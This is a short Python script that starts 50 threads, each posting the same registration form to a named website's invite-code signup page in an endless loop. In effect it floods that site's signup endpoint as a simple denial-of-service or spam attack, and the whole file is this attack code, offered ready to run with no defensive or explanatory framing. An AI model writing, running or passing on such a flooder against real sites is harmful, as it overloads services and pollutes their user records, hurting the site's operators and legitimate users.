import requests
import threading

url = 'https://www.aim7777.com/index/auth/signup/invitecode/TR94Y.html'

# Get user input for registration data
mobile = input("Enter mobile number: ")
password = input("Enter password: ")
cpassword = input("Confirm password: ")
invitecode = input("Enter invite code: ")

data = {
    'mobile': mobile,
    'password': password,
    'cpassword': cpassword,
    'invitecode': invitecode,
}

def do_request():
    while True:
        response = requests.post(url, data=data).text
        print(response)

threads = []

for i in range(50):
    t = threading.Thread(target=do_request)
    t.daemon = True
    threads.append(t)

for i in range(50):
    threads[i].start()
    
for i in range(50):
    threads[i].join()
